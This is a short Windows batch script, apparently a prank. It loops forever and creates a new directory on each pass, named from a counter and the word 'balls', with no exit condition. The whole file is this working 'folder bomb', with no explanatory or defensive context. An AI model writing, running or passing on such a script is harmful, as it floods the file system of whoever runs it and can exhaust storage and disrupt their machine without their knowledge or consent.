@echo off
set  counter=0
:top
md %counter%+"balls"
set /a counter+=1
goto top